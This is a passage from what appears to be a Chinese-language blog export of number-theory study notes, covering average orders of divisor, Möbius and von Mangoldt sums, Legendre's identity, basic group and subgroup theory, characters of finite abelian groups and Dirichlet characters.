我们在上面讨论了$\\alpha=0$的情况，接下来我们讨论$\\alpha=1$和$\\alpha\u0026gt;1$的情况。\nTheorem:\n**Th1:**对所有的$x\\ge 1$我们有 $$ \\sum_{n\\le x}\\sigma_1(n)=\\dfrac{1}{2}\\zeta(2)x^2+\\Omicron(x\\log x) $$\n注：能够证明$\\zeta(2)=\\dfrac{\\pi^2}{6}$，所以$\\sigma_1(n)$的平均阶是$\\dfrac{\\pi^2n}{12}$\nProof:\n与上一个chapter相似，我们写成下面的这种形式： $$ \\begin{align*} \\sum_{n\\le x}\\sigma_1(n) \u0026amp;=\\sum_{n\\le x}\\sum_{q|n}q=\\sum_{q,d \\newline qd\\le x}q=\\sum_{d\\le x}\\sum_{q\\le\\dfrac{x}{d}}q \\newline \u0026amp;=\\sum_{d\\le x}{\\frac{1}{2}(\\frac{x}{d})^2+\\Omicron(\\frac{x}{d})} \\newline \u0026amp;=\\frac{x^2}{2}\\sum_{d\\le x}\\frac{1}{d^2}+\\Omicron(x\\sum_{d\\le x}\\frac{1}{d}) \\newline \u0026amp;=\\frac{x^2}{2}\\sum_{d\\le x}{-\\frac{1}{x}+\\zeta(2)+\\Omicron(\\frac{1}{x^2})}+\\Omicron(x\\log x) \\newline \u0026amp;=\\dfrac{1}{2}\\zeta(2)x^2+\\Omicron(x\\log x) \\newline \\end{align*} $$ 配合欧拉求和完成求证。\n**Th2:**如果$x\\ge1$且$\\alpha\u0026gt;0,\\alpha \\ne 1$，我们有 $$ \\sum_{n\\le x}\\sigma_\\alpha(n)=\\dfrac{\\zeta(\\alpha+1)}{\\alpha+1}x^{\\alpha+1}+\\Omicron(x^\\beta) $$\n其中，$\\beta=max{1,\\alpha}$\nProof:\n配合欧拉求和公式的推论，我们开始证明： $$ \\begin{align*} \\sum_{n\\le x}\\sigma_\\alpha(n)\u0026amp;=\\sum_{n\\le x}\\sum_{q|n}q^\\alpha=\\sum_{d\\le x}\\sum_{q\\le \\frac{x}{d}}q^\\alpha \\newline \u0026amp;=\\sum_{d\\le x}(\\dfrac{1}{\\alpha+1}(\\dfrac{d}{x})^{\\alpha+1}+\\Omicron(\\dfrac{x^\\alpha}{d^\\alpha})) \\newline \u0026amp;=\\dfrac{x^{\\alpha+1}}{\\alpha+1}\\sum_{d\\le x}\\dfrac{1}{d^{\\alpha+1}}+\\Omicron(x^\\alpha\\sum_{d\\le x}\\dfrac{1}{d^\\alpha}) \\newline \u0026amp;=\\dfrac{x^{\\alpha+1}}{\\alpha+1}{\\dfrac{x^{-\\alpha}}{-\\alpha}+\\zeta(\\alpha+1)+\\Omicron(x^{-\\alpha-1})}+\\Omicron(x^\\alpha{\\dfrac{x^{1-\\alpha}}{1-\\alpha}+\\zeta(\\alpha)+\\Omicron(x^{-\\alpha})}) \\newline \u0026amp;=\\dfrac{\\zeta(\\alpha+1)}{\\alpha+1}x^{\\alpha+1}+\\Omicron(x)+\\Omicron(1)+\\Omicron(x^\\alpha) \\newline \u0026amp;=\\dfrac{\\zeta(\\alpha+1)}{\\alpha+1}x^{\\alpha+1}+\\Omicron(x^\\beta) \\end{align*} $$ 其中，$\\beta=max{1,\\alpha}$\nTh3:对于负数$\\alpha$的$\\sigma_\\alpha(n)$的平均阶，我们让$\\alpha=-\\beta,\\beta\u0026gt;0$。\n如果$\\beta\u0026gt;0$，令$\\delta=max{0,1-\\beta}$，当$x\u0026gt;1$我们有\n$$ \\sum_{n\\le x}\\sigma_{-\\beta}(n)= \\begin{cases} \\zeta(\\beta+1)x+\\Omicron(x^\\delta)\u0026amp;,\\beta \\ne 1 \\newline \\zeta(2)x+\\Omicron(\\log x)\u0026amp;,\\beta=1 \\newline \\end{cases} $$\n其中，$\\beta=max{1,\\alpha}$\nProof:\n我们有 $$ \\begin{align*} \\sum_{n\\le x}\\sigma_{-\\beta}(n) \u0026amp;=\\sum_{n\\le x}\\sum_{d|n}\\dfrac{1}{d^\\beta} =\\sum_{d\\le x}\\dfrac{1}{d^\\beta}\\sum_{q\\le \\frac{x}{d}}1 \\newline \u0026amp;=\\sum_{d\\le x}\\dfrac{1}{d^\\beta}{\\dfrac{x}{d}+\\Omicron(1)} \\newline \u0026amp;=x\\sum_{d\\le x}\\frac{1}{d^{\\beta+1}}+\\Omicron(\\sum_{d\\le x}\\dfrac{1}{d^\\beta}) \\end{align*} $$ 最后一项当$\\beta=1$时是$\\Omicron(\\log x)$，当$\\beta \\ne1$时是$\\Omicron(x^\\delta)$： $$ x\\sum_{d\\le x}\\dfrac{1}{d^{\\beta+1}}=\\dfrac{x^{1-\\beta}}{-\\beta}+\\zeta(\\beta+1)x+\\Omicron(x^{-\\beta})=\\zeta(\\beta+1)x+\\Omicron(x^{1-\\beta}) $$\nChapter3 $\\mu(n)$和$\\Lambda(n)$的平均阶 Theorem:\n**Th1:**如果$h=f*g$，令 $$ H(x)=\\sum_{n\\le x}h(n),F(x)=\\sum_{n\\le x}f(n),G(x)=\\sum_{n\\le x}g(n) $$\n则有 $$ H(x)=\\sum_{n\\le x}f(n)G(\\dfrac{x}{n})=\\sum_{n\\le x}g(n)F(\\dfrac{x}{n}) $$\nProof:\n令 $$ U= \\begin{cases} 0\u0026amp;,0 ,x\u0026lt;1 \\newline 1\u0026amp;,x \\ge 1 \\end{cases} $$ 于是根据广义卷积得到：$F=f\\circ U,G=g \\circ U$\n使用结合律得到 $$ f \\circ G = f \\circ(g \\circ U)=(fg)\\circ U=H \\newline g \\circ F = g \\circ(f \\circ U)=(gf)\\circ U=H $$\n**Th2:**如果$F(x)=\\sum\\limits_{n\\le x}f(n)$，则有 $$ \\sum_{n\\le x}\\sum_{d|n}f(d)=\\sum_{n\\le x}f(n)[\\dfrac{x}{n}]=\\sum_{n\\le x}F(\\dfrac{x}{n}) $$\nProof:\n我们把上面证明出来的定理中，对所有的n，$g(n)=1$，那么$G(x)=[x]$\n于是这个定理对应上一个定理的结论。\n**Th3:**对所有的$x\\ge1$，我们有 $$ \\sum_{n\\le x}\\mu(n)[\\dfrac{x}{n}]=1 \\newline \\sum_{n\\le x}\\Lambda(n)[\\dfrac{x}{n}]=\\log {[x]!} $$\n​\t当且仅当$x\u0026lt;2$时，等号成立。\nProof:\n根据定理2： $$ \\sum_{n\\le x}\\mu(n)[\\dfrac{x}{n}]=\\sum_{n\\le x}\\sum_{d|n}\\mu(d)=\\sum_{n\\le x}[\\dfrac{1}{n}]=1 \\newline \\sum_{n\\le x}\\Lambda(n)[\\dfrac{x}{n}]=\\sum_{n\\le x}\\sum_{d|n}\\Lambda(d)=\\sum_{n\\le x}\\log n=\\log{[x]!} $$\n**Th4:**对所有的$x\\ge1$，我们有 $$ |\\sum_{n\\le x}\\dfrac{\\mu(n)}{n}|\\le1 $$\n​\t当且仅当$x\u0026lt;2$时，等号成立。\nProof:\n如果$x\u0026lt;2$,那么这个求和里面只有一个$\\mu(1)=1$\n假设$x\\ge2$，对每个实数y，我们有${y}=y-[y]$，于是有 $$ \\begin{align*} 1 \u0026amp;= \\sum_{n\\le x}\\mu(n)[\\dfrac{x}{n}]=\\sum_{n\\le x}\\mu(n)(\\dfrac{x}{n}-{\\dfrac{x}{n}}) \\newline \u0026amp;=x\\sum_{n\\le x}\\dfrac{\\mu(n)}{n}-\\sum_{n\\le x}\\mu(n){\\dfrac{x}{n}} \\newline \\end{align*} $$ 因为$0\\le {y} \u0026lt; 1$，所以 $$ x|\\sum_{n\\le x}\\dfrac{\\mu(n)}{n}|=|1+\\sum_{n\\le x}\\mu(n){\\dfrac{x}{n}}| \\newline \\le 1+\\sum_{n\\le x}{\\dfrac{x}{n}} =1+{x}+\\sum_{2\\le n \\le x}{\\dfrac{x}{n}} \\newline \u0026lt; 1+{x}+[x]-1=x $$ 两边除x得到不等号\nTh5:（勒让德等式 Legendre\u0026rsquo;s identity）\n对每一个$x\\ge1$，我们有\n$$ [x]! = \\prod_{p\\le x}p^{\\alpha(p)} $$\n​\t其中， $$ \\alpha(p)=\\sum_{m=1}^\\infty[\\dfrac{x}{p^m}] $$ ​\t注：$\\alpha(p)$的和式是有限的，因为对于$p\u0026gt;x,\\dfrac{[x]}{p^m}=0$\nProof:\n如果n不是素数幂，那么有$\\Lambda(n)=0$。\n对于素数幂的n，有$\\Lambda(p^m)=\\log p$。\n所以 $$ \\log{[x]!}=\\sum_{n\\le x}\\Lambda(n)[\\dfrac{x}{n}]=\\sum_{p\\le x}\\sum_{m=1}^{\\infty}[\\dfrac{x}{p^m}]\\log p=\\sum_{p\\le x}\\alpha(p)\\log p $$\n下面利用欧拉求和公式去确定$\\log[x]!$的渐进公式。\n**Th6:**如果$x\\ge2$，我们有 $$ \\log[x]! = x\\log x - x + \\Omicron(\\log x) $$\n同时就有 $$ \\sum_{n\\le x}\\Lambda(n)[\\dfrac{x}{n}]= x\\log x - x + \\Omicron(\\log x) $$\nProof:\n在欧拉求和公式里取$f(t)=\\log t$可以得到： $$ \\begin{align*} \\sum_{n\\le x}\\log n\u0026amp;=\\int_{1}^x\\log t{\\rm d}x+\\int_{1}^x\\dfrac{t-[t]}{t}dt-(x-[x])\\log x \\newline \u0026amp;=x\\log x - x+1+\\int_{1}^x\\dfrac{t-[t]}{t}dt+\\Omicron(\\log x) \\end{align*} $$ 而$\\int_{1}^x\\dfrac{t-[t]}{t}dt =\\Omicron(\\int_1^x\\dfrac{1}{t}dt) = \\Omicron(\\log x)$\n接下来是上一个定理的推论:\n**Th7:**如果$x\\ge2$，我们有 $$ \\sum_{p\\le x}[\\dfrac{x}{p}]\\log p=x\\log x+\\Omicron(x) $$\nProof:\n如果n不是素数幂，那么有$\\Lambda(n)=0$。 $$ \\begin{align*} \\sum_{n\\le x}[\\dfrac{x}{n}]\\Lambda(n)\u0026amp;=\\sum_{p}\\sum_{m=1}^\\infty[\\dfrac{x}{p^m}]\\Lambda(p^m) \\newline \u0026amp;=\\sum_{p}\\sum_{m=1}^\\infty[\\dfrac{x}{p^m}]\\log p \\newline \u0026amp;=\\sum_{p\\le x}[\\dfrac{x}{p}]\\log p + \\sum_{p\\le x}\\sum_{m=2}^\\infty[\\dfrac{x}{p^m}]\\log p \\end{align*} $$ 接下来证明等式最后一项为$\\Omicron(x)$ $$ \\begin{align*} \\sum_{p\\le x}\\sum_{m=2}^\\infty[\\dfrac{x}{p^m}]\\log p \u0026amp;=\\sum_{p\\le x}\\log p\\sum_{m=2}^\\infty[\\dfrac{x}{p^m}] \\newline \u0026amp;\\le\\sum_{p\\le x}\\log p\\sum_{m=2}^\\infty\\dfrac{x}{p^m} \\newline \u0026amp;=x\\sum_{p\\le x}\\log p\\sum_{m=2}^\\infty\\dfrac({1}{p})^m \\newline \u0026amp;=x\\sum_{p\\le x}\\dfrac{\\log p}{p(p-1)} \\newline \u0026amp;\\le x\\sum_{n=2}^\\infty\\dfrac{\\log n}{n(n-1)} \\newline \u0026amp;=\\Omicron(x) \\end{align*} $$ 于是证明了 $$ \\sum_{n\\le x}[\\dfrac{x}{n}]\\Lambda(n) =\\sum_{p\\le x}[\\dfrac{x}{p}]\\log p + \\Omicron(x) $$ 结合上一个定理 $$ \\sum_{n\\le x}\\Lambda(n)[\\dfrac{x}{n}]= x\\log x - x + \\Omicron(\\log x) $$ 可以得到 $$ \\sum_{p\\le x}[\\dfrac{x}{p}]\\log p + \\Omicron(x) = x\\log x - x + \\Omicron(\\log x) \\newline \\sum_{p\\le x}[\\dfrac{x}{p}]\\log p=x\\log x+\\Omicron(x) $$\n","date":"2023-09-23T12:14:00Z","permalink":"https://dorinxl.github.io/p/%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%B9%B3%E5%9D%87%E9%98%B6/","title":"几个函数的平均阶"},{"content":" 本文使用Typora编写，但Hugo使用KaTex渲染，可能会出现不兼容状态，如需最佳体验请前往这里\n目录 Chapter1 群的定义、性质 Chapter2 构造子群 Chapter3 有限阿贝尔群的特征 Chapter4 狄利克雷特征 Chapter1 群的定义、性质 Section1 群 Definition：\n群：一个群是由元素和二元运算组成的非空集合。我们用$\\cdot$表示这种二元运算，群是满足下列条件的代数结构(algebraic structure) 封闭性：$\\forall a,b \\in G,a \\cdot b \\in G;(Z,\\div)$不是封闭性 结合性：$\\forall a,b,c \\in G,a \\cdot(b\\cdot c) = (a \\cdot b)\\cdot c$ 单位元：$\\exist e \\in G,\\forall a \\in G,a \\cdot e = e \\cdot a = a$ 逆元：$\\forall a \\in G,\\exist b \\in G,a \\cdot b = b\\cdot a = e. a的逆元记为a^{-1}$ Examples:\n$(Z,+)$（满足群的定义） 封闭性：整数相加还是整数 结合律：整数相加满足加法结合律 单位元：0 逆元：整数的相反数 $(Q,\\times)$（不满足群的定义） 封闭性：有理数相乘还是有理数 结合律：有理数相乘满足乘法结合律 单位元：1 逆元：有理数的倒数（0除外） $(Q/{0},\\times)$排除0的集合满足群的定义。 $(Z_p^{*},\\times)$ 封闭性：相乘再模p，还是集合里的元素 结合律：模运算满足乘法结合律 单位元：1 逆元：乘法逆元 Theorem:\n**Th1:**群里的单位元是唯一的。 Proof:反证法：\n假设存在两个单位元$e$,$e\u0026rsquo;\\in G，e\\ne e'$\n根据单位元的运算：$e*e\u0026rsquo; = e\u0026rsquo; = e$，出现矛盾\n**Th2:**每个群里只有唯一的逆元。 Proof:反证法：\n假设$a \\in G$存在两个不相等的逆元$b,c$\n$b=be$，而$ac=e$，所以有$b=be=b(ac)=(ba)c=ec=c$\n所以$b=c$，矛盾。\nTh4:（消去律）$ab=ac \\Rightarrow b=c$ Proof: $$ \\begin{align*} ab\u0026amp;=ac \\newline a^{-1}ab\u0026amp;=a^{-1}ac \\newline eb\u0026amp;=ec \\newline b\u0026amp;=c \\newline \\end{align*} $$\n**Th5:**方程$a*x=b$有唯一解$x \\in G$ Proof:\n需要注意的是，这是个群的方程，运算符号不代表乘号。 $$ \\begin{align*} a*x\u0026amp;=b \\newline a^{-1}ax\u0026amp;=a^{-1}b \\newline ex\u0026amp;=a^{-1}*b \\newline x\u0026amp;=a^{-1}b \\end{align} $$\nTh6:$(a*b)^{-1}=b^{-1} * a^{-1}$ Proof:\n思路是证明一个元素是另一个元素的逆元： $$ \\begin{align*} \u0026amp;(ab)(b^{-1}a^{-1}) \\newline \u0026amp;=a(bb^{-1})a^{-1} \\newline \u0026amp;=aea^{-1} \\newline \u0026amp;=aa^{-1} \\newline \u0026amp;=e \\end{align} $$\nTh7:$(a^{-1})^{-1}=a$ 因为$a^{-1}*a=e$,所以$a^{-1}$的逆元就是$a$\nNote:\n群里只有一个元素时，称为平凡群，这唯一的元素就是单位元。如$({1},\\times)$\nSection2 阿贝尔群（Abelian Group） Definition：\n阿贝尔群又叫交换群（commutative group），如果对于群G中的任意元素$a,b \\in G$，都有$ab=ba$，那么G称为阿贝尔群。由此，阿贝尔群就是在群的性质上添加了交换律。所以一个阿贝尔群满足以下性质： 封闭性、结合律、单位元、逆元、交换律。 之前提到的$(Z,+),(Z_P^*,\\times),(Q/{0},\\times)$都满足交换律，所以都是阿贝尔群。 Theorem:\n**Th1:**群G是阿贝尔群，当且仅当，$\\forall a,b \\in G$，有$(a*b)^2 = a^2 * b^2$ Proof:\n必要性$\\Rightarrow$：群G是阿贝尔群，有$ab=ba$\n于是$aabb=abab$\n所以$a^2b^2=(ab)^2$\n充分性$\\Leftarrow$：\n群G满足$a^2b^2=(ab)^2$\n于是展开得到$aabb=abab$\n分别消去前后的$a,b$得到$ab=ba$正好是交换律的式子\n**Th2：**语法糖\n$$a^t=aaa*\\cdots*a$$\n$a^{-t}=a^{-1}a^{-1}a^{-1}\\cdotsa^{-1}$\n$(a^t)^m=a^{tm}$\n$$ \\begin{align*} \u0026amp;(a^t)^m \\newline \u0026amp;=(aa\\cdotsa)\\cdots*(aa\\cdotsa) \\newline \u0026amp;=aa*\\cdotsa\\cdotsaa*\\cdotsa \\newline \u0026amp;=a^{tm} \\end{align} $$\n$a^t * a^m= a^{t+m}$\n$(a^{-1})^t=(a^t)^{-1}$\n$$ \\begin{align*} \u0026amp;(a^{-1})^t*(a^t)^{-1} \\newline \u0026amp;=a^{-1}a^{-1}\\cdotsa^{-1}aa\\cdotsa \\newline \u0026amp;=a^{-1}a^{-1}\\cdotsea\\cdotsa \\newline \u0026amp;=e \\end{align} $$\n**Th3:**G是阿贝尔群，$\\forall a,b \\in G,$有$(ab)^t=a^tb^t$\n$$ \\begin{align*} (ab)^t\u0026amp;=(ab)(ab)\\cdots(ab) \\newline \u0026amp;=abab*\\cdotsab \\newline \u0026amp;=(aa\\cdotsa)(bb\\cdotsb) \\newline \u0026amp;=a^tb^t \\end{align*} $$\n将t=2，就和Th1相等了。\nSection3 子群（subgroup） Definition：\n设$(G,)$是群，H是G的非空子集，如果$(H,)$是一个群，那么$(H,)$是$(G,)$的子群。 平凡子群：$(G,),({e},)$ Theorem:\nTh1:（群的单位元也是其子群的单位元）H是群G的子群，$e\\in G$是单位元，则$e$也是子群H的单位元。 Proof:\n假设H的单位元是$e\u0026rsquo;且e\u0026rsquo;\\ne e$，对于$a\\in H$来说，有\n$e\u0026rsquo;a=a=ea$\n根据消去律，我们的得到$e\u0026rsquo;=e$，矛盾。\nTh2：（元素在子群中，其逆元也必然在子群中）$H$是群$G$的子群，$a\\in H$那么$a^{-1} \\in H$\nProof：\n假设$b\\in H,b \\ne a^{-1},a*b=e$\n那么有$aa^{-1}=e=ab$\n根据消去律，我们得到$a^{-1}=b$，矛盾\n**Th3:**如何判断子群？\n$H$是群$G$的子群，$\\forall a,b \\in H$。都有$a*b^{-1}\\in H$，那么$H$是$G$的子群。\nProof:\n对$\\forall a \\in H$,有$e=a*a^{-1}\\in H$，所以G的单位元也是H的单位元\n对$\\forall a \\in H$,有$a^{-1}=e*a^{-1}\\in H$，所以a的逆元也在H中\n对$\\forall a,b \\in H$,有$b^{-1}\\in H$，所以$ab=a(b^{-1})^{-1} \\in H$,所以H是封闭的。\nG有结合律，他的子集一定也有结合律\n如果$G\u0026rsquo;$是$G$的一个非空子集，那么$G\u0026rsquo;$是$G$的一个子群，当且仅当，$G\u0026rsquo;$满足封闭性和逆元存在性。\n封闭性：$\\forall a,b, \\in G\u0026rsquo;,ab\\in G'$ 逆元存在性：$a,\\in G\u0026rsquo;,a^{-1} \\in G'$ 如果$G\u0026rsquo;$是子群，那么子群肯定满足封闭性和逆元存在性。\n反过来，如果$G\u0026rsquo;$满足封闭性和逆元存在性，我们只需要证明满足结合性和单位元就能证明他是个子群。\n$G$是满足结合性的，那么$G\u0026rsquo;$中的元素肯定也满足结合性。\n因为$G\u0026rsquo;$非空，所以取其中一个元素$a$，已经知道$a^{-1} \\in G\u0026rsquo;$，再根据封闭性：$aa^{-1}=e\\in G\u0026rsquo;$得到单位元存在。\nChapter2 构造子群 Section1 针对阿贝尔群的两种构造方法 Theorem:\n**Th1:**G是阿贝尔群，$m\\in Z$，那么$G^{m}:={a^m | a\\in G}$是G的子群 例如$G^{3}:={a^3 | a\\in G},G^{-3}:={(a^{-1})^{3} | a\\in G},G^{0}:={e | e\\in G}$ Proof:\n$a,b \\in G$,那么如果是子群的话，在子群里表示为$a^m,b^m\\in G^m$。\n根据子群的判断方法，只需要证明$a^m*(b^m)^{-1} = a^m*(b^{-1})^m = (a*b^{-1})^m \\in G^m$\n因为G是封闭的，所以$(a*b^{-1})$是G里的元素\n举个简单的例子：\n对于$(Z,+)$来说，$Z^m$其实就是$mZ:={mz | z \\in Z}={0,\\pm m,\\pm2m,\\cdots}$\n对于$(Z_n,+)$来说,他是个阿贝尔加法群，$Z^m$其实就是$mZ_n:={mz \\bmod n | z \\in Z_n}$\n$Z_{15}$ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $2Z_{15}$ 0 2 4 6 8 10 12 14 1 3 5 7 9 11 13 $3Z_{15}$ 0 3 6 9 12 0 3 6 9 12 0 3 6 9 12 $4Z_{15}$ 0 4 8 12 1 5 9 13 2 6 10 14 3 7 11 $5Z_{15}$ 0 5 10 0 5 10 0 5 10 0 5 10 0 5 10 $6Z_{15}$ 0 6 12 3 9 0 6 12 3 9 0 6 12 3 9 **Th2：**G是阿贝尔群，$m\\in Z$，则$G{m}:={a\\in G|a^m=e}$是G的子群。(挑出来m次运算后等于单位元的数)\nProof：\n首先$a,b \\in G,a^m = b^m = e$,那么$a,b \\in G{m}$。\n$(ab^{-1})^m=a^m * (b^{-1})^m = a^m * (b^m)^{-1}=ee=e$\n所以$a*b^{-1} \\in G$,$G{m}$是G的一个子集。\n举个简单的例子：\n对于$(Z_n,+)$来说,他是个阿贝尔加法群，$Z^m$其实就是$mZ_n:={mz \\equiv0 \\bmod n | z \\in Z_n}$（0是单位元）\n把z看成未知数，$d=(m,n)$，$mz \\equiv0 \\pmod n \\Rightarrow z \\equiv 0 \\pmod{\\dfrac{n}{d}}$\n可见，$Z_n$中的元素只有在是$\\dfrac{n}{d}$的倍数的时候，才是子集中的元素。\n根据同余方程的性质，子集中的元素一共有d个，分别是${0,\\dfrac{n}{d},\\dfrac{2n}{d},\\cdots,\\dfrac{(d-1)n}{d}}$\n根据第一种构造方法，上面的集合就等于$\\dfrac{n}{d}Z_n$。\n而且，上面的集合中的元素乘d后就是n的倍数，模n为0，于是又可以写成$Z_n{d}$\n于是$Z_N{m}=Z_n{d}=\\dfrac{n}{d}Z_n,d=(m,n)$这三个子集相同。\n对照上表印证结论$Z_{15}{6}=Z_{15}{3}=\\dfrac{15}{3}Z_{15}={0,5,10},3=(6,15)$。\nSection2 子群的结构 Definition：\n一个群如果是有限集合，就称为是有限群，这时G的元素的个数叫做G的阶，记为$|G|$ 如果$G\u0026rsquo;$是有限群$G$的一个子群，那么对G的任意元素$a$，有一个整数$n$，使$a^n \\in G\u0026rsquo;$,我们称这个n为a在G中的指数。 Theorem:\nTh1:令$G\u0026rsquo;$是有限阿贝尔群G的一个子群，并且$G\u0026rsquo;\\ne G$,在G中挑选一个元素$a$，$a \\notin G\u0026rsquo;$，并设$h$是$a$在$G\u0026rsquo;$中的指数。那么乘积的集合$G\u0026rsquo;\u0026rsquo;={xa^k | x\\in G\u0026rsquo; 且k=0,1,2,\\cdots,h-1}$这样一个集合是$G$的一个包含$G\u0026rsquo;$的子群，而且$G\u0026rsquo;\u0026rsquo;$的阶是$G\u0026rsquo;$的h倍，即$|G\u0026rsquo;\u0026rsquo;| = h|G\u0026rsquo;|$\nProof：\n首先证明$G\u0026rsquo;\u0026rsquo;$是一个子群。我们通过证明$G\u0026rsquo;\u0026rsquo;$集合拥有封闭性和逆元存在性来证明他是$G$的一个子集。\n证明封闭性：\n在$G\u0026rsquo;\u0026rsquo;$中任取两个元素$xa^k,ya^j;x,y\\in G\u0026rsquo;,0\\le k\u0026lt;h,0\\le j\u0026lt;h$。\n既然$G$是阿贝尔群，所以元素都满足交换律，所以 $$ (xa^k)(ya^j)=(xy)a^{k+j} $$ 将$k+j$改写为带余除法的形式$k+j=qh+r,0\\le r\u0026lt;h$，有 $$ a^{k+j}=a^{qh}a^r $$ 而$a^{qh}=(a^h)^q\\in G\u0026rsquo;$,我们发现$a^{qh}a^r$满足$G\u0026rsquo;\u0026rsquo;$集合的定义，所以证明了$G\u0026rsquo;\u0026rsquo;$满足封闭性条件。\n证明逆元存在：\n在$G\u0026rsquo;\u0026rsquo;$中任取一个元素$xa^k$，如果$k=0$，那这个元素的逆元$x^{-1}\\in G\u0026rsquo;$。\n如果$0\u0026lt;k\u0026lt;h$，这个元的逆元就变成了$ya^{h-k},y=x^{-1}(a^h)^{-1}$，这个形式也满足集合$G\u0026rsquo;\u0026rsquo;$的定义，所以证明了逆元也是$\\in g\u0026rsquo;\u0026rsquo;$的。\n确定$G\u0026rsquo;\u0026rsquo;$的阶：\n令$m=|G\u0026rsquo;|$，因为$x\\in G\u0026rsquo;$，所以$x$可以有m种取法。而$0\\le k\\le h-1$，k有h种取法。组合起来$xa^k$应该是有$mh$种形式的，也就是有mk个。只要我们能证明这mk个元素两两互不相同，便可以证明$G\u0026rsquo;\u0026rsquo;$的阶是mh。\n假设两个元素相等$xa^k=ya^j \\quad (0\\le j\\le k \u0026lt; h)$，那么$a^{k-j}=x^{-1}y$。\n而$x^{-1}y\\in G\u0026rsquo;$，所以$a^{k-j} \\in G\u0026rsquo;$。所以只能取$e$，那么$k=j，x=y$，最后两个元素其实还是一个元素。\nChapter3 有限阿贝尔群的特征 Definition：\n令$G$是任意一个群，定义在$G$上的一个复值函数（$Z\\rightarrow C$，从整数到复数）$f$，如果这个函数是积性的且非0，即 $$ \\forall a,b \\in G,f(ab)=f(a)f(b) \\newline \\exist c,f(c)\\ne0 $$ 那么$f$就称为$G$的一个特征。 Theorem:\nTh1:如果$f$是一个具有恒等元e的有限群G的一个特征，那么$f(e)=1$，并且每个函数值$f(a)$是一个单位根。特别的，如果$a^n=e,f(a)^n=1$\nProof：\n$G$中选$c,f(c)\\ne0$。因为$ce=c$，所以$f(c)f(e)=f(c)$，所以$f(e)=1$。\n如果$a^n=e$，那么$f(a)^n=f(a^n)=f(e)=1$.\nTh2:阶为n的有限阿贝尔群有且仅有n个不同的特征。\nProof：\n证明思路：\n通过上面的一个定理我们知道如何通过一个已知的子群$G\u0026rsquo;\\ne G$去构造一个包含$G\u0026rsquo;$的新子群$G\u0026rsquo;\u0026rsquo;$，而且$G\u0026rsquo;\u0026rsquo;$中至少有一个元素不在$G\u0026rsquo;$中。 $$ 我们将G\u0026rsquo;\u0026lsquo;表示为\u0026lt;G\u0026rsquo;;a\u0026gt;={xa^k:x\\in G\u0026rsquo;,0\\le k \u0026lt; h},h是a在G\u0026rsquo;中的指数 $$ 现在我们将最小的子群${e}$拿出来作为$G_1$，如果$G_1 \\ne G$，那么我们可以通过多次构造来得到一个有限集合和相对应子群的集合。 $$ G_{r+1}=\u0026lt;G_r;a_r\u0026gt; \\newline G_1\\subset G_2\\subset \\cdots\\subset G_{r+1}=G $$ 我们拥有这样一个子序列后，再通过归纳法即可证明。\n$G_1$显然有且仅有一个特征$f(e)=1$。假设对$G_r$的阶是$m$并且由且仅有$m$个特征。\n考虑$G_{r+1}=\u0026lt;G_r,a_r\u0026gt;$并设h是$a_r$在$G_r$中的指数（h是让$a_r^h\\in G$的最小正整数）。\n如果能证明有且仅有$h$种不同的方法把$G_r$的每个特征$f$扩大到$G_{r+1}$的一个特征，并且$G_{r+1}$的每一个特征一定是$G_r$的某个特征的扩大，那么就说明$G_{r+1}$有$mh$个特征，并且$G_{r+1}$的阶是mh，所以归纳法证明成立。\n先假设能把$G_r$的一个特征扩大为$G_{r+1}$的一个特征$F$。根据积性得到： $$ F(xa_r^k)=F(x)F(a_r)^k $$ $x\\in G$，所以$F(x)=f(x)$。于是我们有 $$ F(xa_r^k)=f(x)F(a_r)^k $$ 所以只要确定$F(a)^k$，就能确定$F(xa^k)$\n令$c=a_r^h$，因为$c\\in G_r$，所以$F(c)=f(c)$并且由于$F$是积性的，$F(c)=F(a)^h$\n所以$F(a_r)^h=f(c)$，我们可以确定$F(a_r)$是$f(c)$的一个$h$次根。所以$F(a_r)$有h种选择。\n总结一下，如果$f$是$G_r$的一个已经确定的特征，我们选择$f(c),(c=a_r^h)$的h词根中的一个，确定$F(a_r)$就是这个数，所以我们用$F(xa_r^k)=f(x)F(a_r)^k$来确定$G_{r+1}$中不属于$G_r$那部分元素的特征$F$。=所以我们有$h$种方式去确定$F(xa_r^k)$\n4\n现在我们需要验证这个$F$是否满足可积，不然他不能成为一个特征。\n选择两个元素，我们有 $$ F(xa_r^k \\cdot ya_r^j)=F(xya_r^{k+j})=f(xy)F(a_r)^{k+j}=f(x)f(y)F(a_r)^kF(a_r)^j=F(xa_r^k)F(ya_r^j) $$ 所以F确实是G的一个特征。\n不可能有两个被扩大的F,G相等，因为如果这样的话，扩大他们的f和g就会相等。\n所以$G_r$的m个特征里的每一个都能被h种方式扩大到$G_{r+1}$的特征。\nChapter4 狄利克雷特征 现在我们专门研究模为一个固定的正整数k的简化剩余类群。\nDefinition：\n令$G$是模k的简化剩余类群，对应于$G$上的每一个特征$f$，我们定义如下一个数论函数$\\chi=\\chi_f$ $$ \\chi(n)=f(\\hat n) \\quad if(n,k)=1 \\newline \\chi(n)=0 \\quad\\quad if(n,k)\u0026gt;1 $$ 称$\\chi$是模k的狄利克雷特征，主特征$\\chi_1$有如下特征： $$ \\chi_1(n)= \\begin{cases} 1,\u0026amp;if(n,k)=1 \\newline 0,\u0026amp;if(n,k)\u0026gt;1 \\end{cases} $$ Theorem:\nTh1:模k的全体简化剩余类的集合是一个阶为$\\varphi(k)$的有限阿贝尔群，恒等元是剩余类$\\hat{1}$，$\\hat a$的逆元是$\\hat b$，满足$ab \\equiv 1 \\pmod k$\nProof：\n剩余类有$\\varphi(k)$个，所以阶是$\\varphi(k)$。\n剩余类的封闭性是满足的，而且是有限剩余类，是阿贝尔群。\n类$\\hat1$是恒等元，$\\hat a$的逆元是$\\hat b$，因为如果$(a,k)=1$存在唯一的$b,ab\\equiv 1 \\pmod k$。\nTh2:有$\\varphi(k)$个不同的狄利克雷特征模k，并且都是完全积性的、周期性的，即 $$ \\chi(mn)=\\chi(m)\\chi(n) \\newline \\chi(n+k)=\\chi(n) $$ 